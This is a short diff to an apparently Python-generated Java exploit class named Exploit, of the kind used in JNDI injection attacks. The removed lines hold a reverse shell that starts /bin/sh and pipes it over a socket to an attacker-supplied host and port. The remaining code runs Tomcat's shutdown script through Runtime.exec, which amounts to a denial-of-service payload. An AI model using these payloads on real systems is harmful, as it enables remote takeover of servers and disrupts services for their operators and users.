@@ -23,22 +23,10 @@ import java.net.Socket;
 public class Exploit {
 
     public Exploit() throws Exception {
-        String host="%s";
-        int port=%d;
-        String cmd="/bin/sh";
-        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
-        Socket s=new Socket(host,port);
-        InputStream pi=p.getInputStream(),
-            pe=p.getErrorStream(),
-            si=s.getInputStream();
-        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
         Process process = Runtime.getRuntime().exec("sh /home/centos/drive/apache-tomcat-8.0.36/bin/shutdown.sh");
-    
-        p.destroy();
-        s.close();
     }
 }
-""" % (userip, lport)
+"""
 
     # writing the exploit to Exploit.java file
 
